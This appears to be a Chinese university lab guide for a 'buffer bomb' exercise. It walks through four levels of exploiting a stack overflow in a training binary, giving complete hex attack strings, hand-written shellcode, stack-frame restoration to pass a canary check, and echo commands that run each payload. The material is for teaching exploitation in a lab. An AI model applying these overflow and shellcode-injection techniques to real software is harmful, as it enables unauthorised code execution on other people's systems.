# 实验3：超级缓冲区炸弹

## 一、代码库用法

### 1.1 运行程序获取通行密码

程序用你的学号初始化一个伪随机数生成器，算出 `cookie` 值（通行密码）。每个学号对应唯一的 cookie。

```bash
echo "" | ./bufbomb.exe 你的学号后6位
```

输出中会看到：

```
你的通行密码是0X2F3426A6
```

记住这个值：`cookie = 0x2F3426A6`，小端序 = `A6 26 34 2F`。

### 1.2 交互式演示

双击 `demo.bat` 即可逐关展示攻击过程，每关包含原理讲解 + 实际攻击。

### 1.3 一键测试全部关卡

```bash
bash run_all.sh          # Linux / Git Bash
```

### 1.4 关键地址（反汇编获取）

用 IDA Pro 打开 `bufbomb.exe`（或查看 `bufbomb_disasm.txt`）：

| 项目 | 地址 | 怎么找 |
|------|------|--------|
| `getbuf` | `0x00401130` | `push ebp` + `sub esp, 0Ch` + `lea eax, [ebp-0Ch]` |
| `test` | `0x00401150` | `mov [ebp-4], 0DEADBEEFh` |
| `Trojan1` | `0x004011F0` | 搜 "恭喜" 字符串的引用 |
| `Trojan2` | `0x00401210` | 紧接 Trojan1 后，`push ebx; mov ebx, [esp+8]` |
| `Trojan3` | `0x00401260` | 紧接 Trojan2 后，`push ebx; mov ebx, ds:0x409004` |
| `Trojan4` | `0x004012B0` | 紧接 Trojan3 后，结尾是 `pop ebx; ret`（不是 exit） |
| `cookie` | `0x00409000` | `cmp ebx, ds:0x409000` |
| `global_value` | `0x00409004` | `mov ebx, ds:0x409004` |
| test 中 call getbuf 返回点 | `0x00401181` | test 里 `call 0x00401130` 后面那条指令 |
| test 返回 main 的地址 | `0x0040140D` | main 里 `call 0x00401150` 后面的 `xor eax, eax` |

### 1.5 getbuf 的栈帧布局

```asm
push ebp              ; 保存旧 EBP
mov  ebp, esp         ; EBP = 当前栈顶
sub  esp, 0Ch         ; 向下开辟 12 字节空间给 buf
lea  eax, [ebp-0Ch]   ; eax = buf 起始地址 = EBP - 0xC
push eax              ; 把 buf 地址作为参数
call  getxs           ; 调用 getxs(buf) 读取输入
```

```
低地址 (栈顶)
  ┌──────────────┐
  │  buf[0..11]  │  ← EBP-0x0C  (你输入的前 12 字节写在这里)
  ├──────────────┤
  │  保存的 EBP   │  ← EBP+0x00  (4 字节，第 13~16 字节覆盖这里)
  ├──────────────┤
  │  返回地址     │  ← EBP+0x04  (4 字节，第 17~20 字节覆盖这里)
  ├──────────────┤
  │  ...         │  ← EBP+0x08 及以上属于 test 的栈帧
  └──────────────┘
高地址 (栈底)
```

**关键**：前 12 字节填 buf，第 13~16 字节覆盖保存的 EBP，**第 17~20 字节覆盖返回地址**。

### 1.6 用 IDA 调试器获取栈地址（第3、4关需要）

1. **设置参数**：菜单 Debugger → Process options → Parameters 填入学号后6位
2. **设断点**：在 getbuf 的 `push ebp`（`0x00401130`）处按 F2
3. **运行**：F9 启动调试
4. **单步**：F7 执行到 `sub esp, 0Ch` 之后
5. **读 EBP**：General Registers 窗口
6. **读栈内容**：Stack view

以学号 720028 为例：

```
EBP = 0x001AFE30

栈内容（从 EBP 开始）：
地址        值           含义
0x001AFE30  0x001AFE48   ← 保存的 EBP = test 的 EBP
0x001AFE34  0x00401181   ← 当前返回地址（test 中 call getbuf 后的下一条指令）
0x001AFE38  0x0000006C   ← test 的 alloca 缓冲区
0x001AFE3C  0x00401177   ← test 的局部数据
0x001AFE40  0x00000002   ← test 的局部数据
0x001AFE44  0xDEADBEEF   ← 金丝雀 bird！
0x001AFE48  0x001AFF3C   ← test 保存的 EBP = main 的 EBP
0x001AFE4C  0x0040140D   ← test 的返回地址（回 main）
```

| 需要的值 | 计算方法 | 示例值 |
|---------|---------|--------|
| buf 起始地址 | EBP - 0xC | `0x001AFE24` |
| test 的 EBP | 栈中 [EBP] 的值 | `0x001AFE48` |
| bird 的地址 | test 的 EBP - 4 | `0x001AFE44` |
| main 的 EBP | 栈中 [test的EBP] 的值 | `0x001AFF3C` |
| test 返回 main 的地址 | 栈中 [test的EBP + 4] | `0x0040140D` |

---

## 二、常见指令机器码

x86（32位）下，CPU 直接执行的是机器码（十六进制字节），汇编只是给人看的助记符。构造攻击字符串时，你需要手写机器码。以下是你需要用到的所有指令：

### 2.1 数据传送

| 汇编 | 作用 | 机器码 | 说明 |
|------|------|--------|------|
| `mov eax, [addr]` | 把内存 addr 处的 4 字节加载到 EAX | `A1 XX XX XX XX` | 固定操作码 `A1`，后跟 4 字节地址（小端序） |
| `mov [addr], eax` | 把 EAX 的值写入内存 addr | `A3 XX XX XX XX` | 固定操作码 `A3`，后跟 4 字节地址（小端序） |
| `nop` | 什么都不做 | `90` | 占位用 |

### 2.2 栈操作

| 汇编 | 作用 | 机器码 | 说明 |
|------|------|--------|------|
| `push imm32` | 把 32 位立即数压栈 | `68 XX XX XX XX` | 固定操作码 `68`，后跟 4 字节立即数（小端序） |
| `push ebx` | 把 ebx 压栈 | `53` | 寄存器编号决定操作码 |
| `pop ebx` | 从栈顶弹出给 ebx | `5B` | |
| `pop ebp` | 从栈顶弹出给 ebp | `5D` | |

### 2.3 控制流

| 汇编 | 作用 | 机器码 | 说明 |
|------|------|--------|------|
| `ret` | 从栈顶弹出地址并跳转 | `C3` | 最关键：`ret` 只做一件事——弹出栈顶 4 字节当跳转地址 |
| `call rel32` | 压入返回地址，跳转到目标 | `E8 XX XX XX XX` | 操作码 `E8`，后跟相对偏移 |

### 2.4 小端序

x86 用小端序存储：**最低字节存在最低地址**。

例如地址 `0x004011F0`，在内存中存为 `F0 11 40 00`（字节顺序反转）。

所有攻击字符串中的地址都必须写成小端序。转法：按字节拆开，反转顺序。

---

## 三、第1关：覆盖返回地址

### 目标

让 `getbuf()` 返回时不回到 `test()`，而是跳到 `Trojan1()`。

### 为什么要这么做

攻击的本质是利用 `getxs()` 不检查输入长度的漏洞。只要输入超过 12 字节，多出的数据就会溢出 buf，覆盖栈上的返回地址。

`getbuf` 结束时执行 `ret`，CPU 做的事很简单：**从栈顶弹出 4 字节当地址，跳过去**。我们覆盖了返回地址，就等于劫持了 CPU 的跳转目标——跳到 Trojan1 而不是 test。

### 为什么会成功

Trojan1 不需要任何参数，也不依赖 EBP，执行完直接调用 `exit(0)` 退出。所以覆盖 EBP 和返回地址之后的部分都不用管，程序不会回头使用它们。

### 攻击字符串（20 字节）

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00
```

逐字节翻译：

```
偏移 0~11:  00 00 00 00 00 00 00 00 00 00 00 00    buf 填充（随便填）
偏移 12~15: 00 00 00 00                              覆盖保存的 EBP（无所谓）
偏移 16~19: F0 11 40 00                              返回地址 = Trojan1
                                                     0x004011F0 的小端序
```

### 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 720028
```

预期输出：`恭喜你！你已经成功偷偷运行了第1只木马!` + `通过第1只木马测试`

---

## 四、第2关：覆盖返回地址 + 构造栈参数

### 目标

跳到 `Trojan2(val)`，并且让参数 `val` 等于 cookie（通行密码）。

### 为什么要这么做

第1关只改了"跳到哪里"，第2关还要"传什么参数"。Trojan2 会校验参数值是否等于 cookie，随便跳过去不行，必须在栈上伪造正确的参数。

关键在于理解 Trojan2 如何读参数。看反汇编：

```asm
push ebx                  ; 保存 ebx
mov  ebx, [esp+8]         ; 从栈上读参数 val
cmp  ebx, ds:0x409000     ; 与 cookie 比较
```

它从 `[esp+8]` 读参数。为什么偏移 +8 而不是 +4？因为控制流到达 Trojan2 时，`ret` 弹出了 getbuf 的返回地址（ESP 上移 4 字节），然后 `push ebx` 又压入了一个值（ESP 下移 4 字节），两次偏移加起来 8 字节：

```
ESP+0   push ebx 保存的旧 ebx
ESP+4   我们覆盖的返回地址（ret 弹出的就是它）
ESP+8   参数 val    ← 我们要控制这里
```

所以返回地址之后还要再放 8 字节才能让 `esp+8` 指向我们的 cookie。

### 为什么会成功

Trojan2 校验完 cookie 后调用 `exit(0)` 退出，不需要正常返回。所以 `esp+4` 处的"假返回地址"填什么都行——Trojan2 永远不会用到它。

### 攻击字符串（28 字节）

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F
```

逐字节翻译：

```
偏移 0~11:  00 00 00 00 00 00 00 00 00 00 00 00    buf 填充
偏移 12~15: 00 00 00 00                              覆盖保存的 EBP
偏移 16~19: 10 12 40 00                              返回地址 = Trojan2
                                                     0x00401210 的小端序
偏移 20~23: 00 00 00 00                              假返回地址（esp+4，不会用到）
偏移 24~27: A6 26 34 2F                              cookie = esp+8 处的参数
                                                     0x2F3426A6 的小端序
```

### 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F" | ./bufbomb.exe 720028
```

预期输出：`不错哦！第2只木马运行了，而且通行密码是正确的！(0X2F3426A6)`

---

## 五、第3关：注入 Shellcode

### 目标

在栈上注入一段机器码（shellcode），让它：
1. 把 `cookie` 写入 `global_value`
2. 跳转到 `Trojan3`

然后覆盖返回地址，让 getbuf 的 `ret` 跳到栈上的 shellcode 来执行。

### 为什么要这么做

前两关只改了栈上的**数据**（地址值、参数值）。第3关更进一步：**把可执行的机器指令直接写在栈上，然后让程序跳过去执行**。

为什么要注入代码而不是直接跳？因为 Trojan3 的检查是 `global_value == cookie`。这个全局变量不是函数参数，不能像第2关那样在栈上伪造——必须有一段代码真正地把 cookie 值写入 global_value 的内存地址（`0x00409004`）。

这段代码从哪来？我们自己写，放在 buf 里。buf 的内容完全由我们控制，而 `bufbomb.exe` 没有开启 DEP（数据执行保护），所以栈上的数据可以被当作代码执行。

### 为什么会成功

1. buf 有 12 字节，shellcode 有 16 字节，恰好覆盖 buf + saved_ebp = 16 字节
2. 返回地址指向 buf 起始地址，`ret` 跳回 buf 开头执行我们写的代码
3. shellcode 最后用 `push Trojan3地址; ret` 实现跳转——等价于一个 `jmp Trojan3`
4. Trojan3 执行完后调用 `exit(0)`，所以覆盖掉的 EBP 无所谓

### Shellcode 机器码（16 字节）

| 汇编 | 机器码 | 作用 |
|------|--------|------|
| `mov eax, [0x409000]` | `A1 00 90 40 00` | 从 cookie 全局变量地址加载值到 EAX |
| `mov [0x409004], eax` | `A3 04 90 40 00` | 把 EAX 写入 global_value 全局变量地址 |
| `push 0x00401260` | `68 60 12 40 00` | 把 Trojan3 地址压栈 |
| `ret` | `C3` | 弹出 Trojan3 地址并跳转 |

### 攻击字符串（20 字节）

```
A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00
```

逐字节翻译：

```
偏移 0~4:   A1 00 90 40 00    mov eax, [0x409000]  ; EAX = cookie
偏移 5~9:   A3 04 90 40 00    mov [0x409004], eax  ; global_value = cookie
偏移 10~14: 68 60 12 40 00    push 0x00401260       ; Trojan3 地址压栈
偏移 15:    C3                ret                   ; 跳到 Trojan3
偏移 16~19: 24 FE 1A 00       返回地址 = buf 栈地址
                               0x001AFE24 的小端序
                               （让 getbuf 的 ret 跳回 buf 执行 shellcode）
```

### 测试

```bash
echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00" | ./bufbomb.exe 720028
```

预期输出：`厉害！第3只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6`

---

## 六、第4关：Shellcode + 保持栈帧完好

### 目标

同第3关注入 shellcode 设置 `global_value = cookie`。但 Trojan4 不调用 `exit(0)`，而是 **`return`** 返回。程序必须继续正常运行。

### 为什么要这么做

前三关的 Trojan 函数都调用 `exit(0)` 直接终止程序，覆盖了什么都无所谓。第4关的 Trojan4 只是 `pop ebx; ret` 返回，控制流会继续走下去。

`test()` 函数在 `getbuf()` 返回后会做两个检查：

```c
if (bird == 0xdeadbeef)  // 金丝雀必须活着
if (val == cookie)       // getbuf 的返回值必须是 cookie
```

如果溢出破坏了 EBP、bird 或返回地址中的任何一个，程序就会崩溃。所以不能像第3关那样暴力覆盖，必须**精确恢复**整个栈帧。

### 解决方案：逆序执行法

核心思想：不是让 getbuf 直接跳到 Trojan4，而是先跳回 test 让它正常检查，检查通过后再让 test 的 ret 跳到 Trojan4。

```
getbuf → shellcode(设EAX=cookie) → ret回到test
       → test检查通过(bird活着, 返回值=cookie) → ret跳到Trojan4
       → Trojan4输出通关信息 → ret回到main → 程序正常结束
```

### 为什么会成功

**为什么 shellcode 只有 12 字节**：刻意设计成刚好等于 buf 的大小，这样就不会溢出到 saved_ebp，避免破坏 test 的栈帧。

**为什么 EAX = cookie 就是 getbuf 的返回值**：x86 函数调用约定中，返回值存在 EAX 里。shellcode 在 test 检查之前就把 EAX 设成了 cookie，所以 test 认为 `getbuf()` 正常返回了 cookie。

**为什么 Trojan4 不需要传参数**：Trojan4 的反汇编是 `mov ebx, ds:0x409004`——它直接从内存地址 `global_value` 读值，不从栈上读参数。shellcode 已经把 `global_value` 设成 cookie 了。

**为什么 test 的 ret 能跳到 Trojan4**：我们覆盖了 test 的返回地址（偏移 40~43），把它从原来的 `0x0040140D`（回 main）改成了 `0x004012B0`（Trojan4）。test 执行完检查后，`ret` 自然弹出这个地址，跳到 Trojan4。

**为什么 Trojan4 返回后不会崩溃**：Trojan4 只是 `push ebx; ...; pop ebx; ret`（没有 ebp 帧）。它的 `ret` 会弹出紧接着的栈上值，我们把 `0x0040140D`（main 里 call test 的返回点）放在偏移 44~47，所以 Trojan4 的 ret 会回到 main，程序正常结束。

### Shellcode 机器码（12 字节）

| 汇编 | 机器码 | 作用 |
|------|--------|------|
| `mov eax, [0x409000]` | `A1 00 90 40 00` | EAX = cookie |
| `mov [0x409004], eax` | `A3 04 90 40 00` | global_value = cookie |
| `nop` | `90` | 占位凑满 12 字节 |
| `ret` | `C3` | 跳回 test |

### 攻击字符串（48 字节）

```
A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00
```

逐字节翻译：

```
=== 偏移 0~11: shellcode (12字节, 刚好填满 buf) ===

偏移 0~4:   A1 00 90 40 00    mov eax, [0x409000]    ; EAX = cookie
偏移 5~9:   A3 04 90 40 00    mov [0x409004], eax    ; global_value = cookie
偏移 10:    90                nop                     ; 占位
偏移 11:    C3                ret                     ; 跳回 test

=== 偏移 12~15: 恢复 test 的 EBP ===

偏移 12~15: 48 FE 1A 00       0x001AFE48 的小端序
                              getbuf 的 leave 指令执行 pop ebp 时
                              会把这个值弹回 EBP
                              如果不恢复，test 里 [ebp-4] 就指向错误地址
                              金丝雀检查会失败

=== 偏移 16~19: 返回地址 = buf 起始地址 ===

偏移 16~19: 24 FE 1A 00       0x001AFE24 的小端序 (buf = EBP - 0xC)
                              getbuf 的 ret 弹出这个地址
                              跳回 buf 开头执行 shellcode

=== 偏移 20~23: shellcode 的 ret 跳转目标 ===

偏移 20~23: 81 11 40 00       0x00401181 的小端序
                              shellcode 的 ret 从栈顶弹出这个地址
                              这是 test 里 call getbuf 后面的那条指令
                              控制流无缝回到 test 的正常路径
                              test 以为 getbuf 正常返回了

=== 偏移 24~31: 填充 alloca 区域 (8字节) ===

偏移 24~31: 00 00 00 00 00 00 00 00
                              test 函数里 _alloca() 分配的栈空间
                              内容无所谓，全填零

=== 偏移 32~35: 金丝雀 bird ===

偏移 32~35: EF BE AD DE       0xDEADBEEF 的小端序
                              test 检查 if (bird == 0xdeadbeef)
                              必须保证金丝雀存活，否则报"鸟死了"

=== 偏移 36~39: 恢复 test 保存的 EBP ===

偏移 36~39: 3C FF 1A 00       0x001AFF3C 的小端序 (main 的 EBP)
                              test 的 leave 执行 pop ebp 时
                              会把这个值弹回 EBP
                              如果不恢复，main 会崩溃

=== 偏移 40~43: 覆盖 test 的返回地址 ===

偏移 40~43: B0 12 40 00       0x004012B0 的小端序 (Trojan4)
                              正常应该是 0x0040140D (回 main)
                              改成 Trojan4 让 test "返回"到 Trojan4

=== 偏移 44~47: Trojan4 返回到 main ===

偏移 44~47: 0D 14 40 00       0x0040140D 的小端序
                              Trojan4 只是 pop ebx; ret
                              它的 ret 会弹出这个值
                              跳回 main 的正常路径，程序正常结束
```

### 测试

```bash
echo "A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00" | ./bufbomb.exe 720028
```

预期输出（注意顺序：test 在前，Trojan4 在后）：

```
鸟还活着！
不错哦！缓冲区溢出成功，而且getbuf返回 0X2F3426A6
厉害！第4只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
通过第4只木马测试
```

### 如果学号不同

alloca 的大小因学号而异，**bird 等关键数据的偏移量不固定**。用 [1.6 节](#16-用-ida-调试器获取栈地址第34关需要) 的方法在 IDA 中获取以下信息：

| 步骤 | 需要查的值 | 在 IDA 中怎么看 | 720028 示例 |
|------|-----------|----------------|------------|
| 1 | getbuf 的 EBP | General Registers 窗口 | `0x001AFE30` |
| 2 | buf 地址 | EBP - 0xC | `0x001AFE24` |
| 3 | test 的 EBP | Stack view 中 [getbuf 的 EBP] 处的值 | `0x001AFE48` |
| 4 | bird 的地址 | test 的 EBP - 4 | `0x001AFE44` |
| 5 | main 的 EBP | Stack view 中 [test 的 EBP] 处的值 | `0x001AFF3C` |
| 6 | main 返回点 | main 里 `call test` 后的指令地址 | `0x0040140D` |

构造步骤：

1. 前 12 字节固定：`A1 00 90 40 00 A3 04 90 40 00 90 C3`
2. 偏移 12~15：test 的 EBP（小端序）
3. 偏移 16~19：buf 地址（小端序）
4. 偏移 20~23：固定填 `81 11 40 00`
5. 偏移 24 到 bird 偏移前：填 `00` 填充
6. bird 偏移处：`EF BE AD DE`
7. bird 后 4 字节：main 的 EBP（小端序）
8. 再后 4 字节：`B0 12 40 00`（Trojan4）
9. 最后 4 字节：main 返回点（小端序）

---

## 七、常见问题

**Q: 提示"鸟死了！堆栈已经被破坏了"？**
A: bird 变量被覆盖。检查是否在正确偏移处放了 `EF BE AD DE`，是否正确恢复了 test 的 EBP。

**Q: 程序崩溃（无输出就挂了）？**
A: 返回地址写错了。检查地址是否用了小端序，第3/4关的栈地址是否是你调试得到的。

**Q: 第3/4关段错误？**
A: buf 的栈地址需要用 IDA 调试器获取，不同学号地址不同。获取后立刻测试。

**Q: 如何把地址转成小端序？**
A: 按字节拆开，反转顺序。`0x004011F0` → `F0 11 40 00`。
